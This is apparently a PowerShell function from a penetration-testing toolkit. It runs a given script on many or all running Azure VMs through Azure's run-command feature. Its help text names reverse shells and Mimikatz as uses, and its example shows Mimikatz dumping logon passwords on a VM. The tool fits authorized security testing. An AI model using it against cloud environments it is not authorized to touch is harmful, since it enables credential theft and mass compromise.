<#
    File: Invoke-AzureRmVMBulkCMD.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2018
    Description: PowerShell function for running PowerShell scripts against multiple Azure VMs.
#>


# Check if the AzureRM Module is installed and imported
if(!(Get-Module AzureRM)){
    try{Import-Module AzureRM -ErrorAction Stop}
    catch{Install-Module -Name AzureRM -Confirm}
    }


Function Invoke-AzureRmVMBulkCMD
{
<#
    .SYNOPSIS
        Runs a Powershell script against all (or select) VMs in a subscription/resource group/etc.
    .DESCRIPTION
        This function will run a PowerShell script on all (or a list of) VMs in a subscription/resource group/etc. This can be handy for creating reverse shells, running Mimikatz, or doing practical automation of work.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER ResourceGroup
        Restrict the script to a specific Resource Group.
    .EXAMPLE
        PS C:\MicroBurst> Invoke-AzureRmVMBulkCMD -Verbose -Script .\Mimikatz.ps1
        Executing C:\MicroBurst\Mimikatz.ps1 against all (1) VMs in the Testing-Resources Subscription
        Are you Sure You Want To Proceed: (Y/n): 
        VERBOSE: Running .\Mimikatz.ps1 on the Remote-West - (10.2.0.5 : 40.112.160.13) virtual machine (1 of 1)
        VERBOSE: Script Status: Succeeded
        Script Output: 
          .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28)
         .## ^ ##.  
         ## / \ ##  /* * *
         ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
         '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
          '#####'                                     with 15 modules * * */


        mimikatz(powershell) # sekurlsa::logonpasswords
        [Truncated]
        mimikatz(powershell) # exit
        Bye!

        VERBOSE: Script Execution Completed on Remote-West - (10.2.0.5 : 40.112.160.13)
        VERBOSE: Script Execution Completed in 37 seconds

    .LINK
        https://blog.netspi.com/running-powershell-scripts-on-azure-vms
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipeline = $true,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage="Subscription to use.")]
        [string[]]$Subscription,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline = $true,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage="Resource Group to use.")]
        [string[]]$ResourceGroupName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline = $true,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage="Individual VM Name(s) to use.")]
        [string[]]$Name = $null,
        
        [Parameter(Mandatory=$true,
        HelpMessage="Script to run.")]
        [string]$Script = "",

        [Parameter(Mandatory=$false,
        HelpMessage="File to use for output.")]
        [string]$output = ""

    )

    # If Subscription, then grab all the VMs in each sub
    if ($Subscription){
        foreach ($sub in $Subscription){
            Select-AzureRmSubscription -SubscriptionName $sub | Out-Null
            # Get a list of the running VMs for the Subscription, run the script on each one
            $vms += Get-AzureRmVM -Status | where {$_.PowerState -EQ "VM running"}
            $VMCount = $vms.Count
            Write-Verbose "Executing $Script against $VMCount VMs in the $sub Subscription"
        }
    }
    
    # If Resource Group, then grab all the VMs in each RG
    if ($ResourceGroupName){
        $vms = $null
        # Iterate the RG list and add the VMs to the array
        foreach($rg in $ResourceGroupName){
            $vms = Get-AzureRmVM -Status -ResourceGroupName $rg | where {$_.PowerState -EQ "VM running"}
            $VMCount = $vms.Count
            Write-Verbose "Executing $Script against $VMCount VMs in the $rg Resource Group"
        }
    }
              
    # If names, run against the names listed  
    if($Name){
        $vms = $null
        # Iterate the name list and add the VMs (that are running) to the array
        foreach($listName in $Name){
            $vms += Get-AzureRmVM -Status | where Name -EQ $listName | where {$_.PowerState -EQ "VM running"}
        }
        $VMCount = $vms.Count
        Write-Verbose "Executing $Script against $VMCount VMs"
    }

    # If no RG or Names, then get all VMs for the current Sub
    if (($ResourceGroupName -eq $null) -and ($Name -eq $null)){
        # Get a list of the running VMs for the Subscription, run the script on each one
        $vms = Get-AzureRmVM -Status | where {$_.PowerState -EQ "VM running"}
        $subName = (Get-AzureRmSubscription -SubscriptionId ((Get-AzureRmContext).Subscription.Id)).Name
        $VMCount = $vms.Count
        Write-Host "Executing $Script against all ($VMCount) VMs in the $subName Subscription"
        $confirmation = Read-Host "Are you Sure You Want To Proceed: (Y/n)"
        if (($confirmation -eq 'n') -or ( $confirmation -eq 'N')) {
          Break
        }
        else{}
    }


    if($vms){
        $VMcounter = 0
        foreach ($vm in $vms){
            $VMcounter++
            # Measure Execution Time
            $commandTime = Measure-Command {
                # Get IP Information for better host tracking
                $NICid = Get-AzureRmNetworkInterface | select Name,VirtualMachine -ExpandProperty VirtualMachine | where Id -EQ $vm.Id
                $VMInterface = Get-AzureRmNetworkInterface -ResourceGroupName $vm.ResourceGroupName -Name $NICid.Name
                $privIP = $VMInterface.IpConfigurations[0].PrivateIpAddress
                $pubIP = (Get-AzureRmPublicIpAddress | where Id -EQ $VMInterface.IpConfigurations[0].PublicIpAddress.Id | select IpAddress).IpAddress

                # Run the PS1 file
                $VMName = $vm.Name
                Write-Verbose "Running $Script on the $VMName - ($privIP : $pubIP) virtual machine ($VMcounter of $VMCount)"
                Try{
                    $scriptOutput = Invoke-AzureRmVMRunCommand -ResourceGroupName $vm.ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath $Script -ErrorAction SilentlyContinue

                    #write verbose the return status and write the output from the script
                    $scriptStatus = $scriptOutput.Status
                    Write-Verbose "Script Status: $scriptStatus"
                    $cmdOut = $scriptOutput.Value[0].Message
                    if ($output){
                            "$Script on the $VMName - ($privIP : $pubIP) virtual machine" | Out-File -Append -FilePath $output
                            $cmdOut | Out-File -Append -FilePath $output
                            Write-Verbose "Script output written to $output"
                        }      
                    else{Write-Host "Script Output: `n$cmdOut"}
                    Write-Verbose "Script Execution Completed on $VMName - ($privIP : $pubIP)"
                }
                Catch{Write-Verbose "`tError in command excution. Check the Azure Activity Log for more details."}
            } | select TotalSeconds
            $outputTime = [int]$commandTime.TotalSeconds
            Write-Verbose "Script Execution Completed in $outputTime seconds"
        }
    }
    else{Write-Host "No VMs selected for code execution"}
}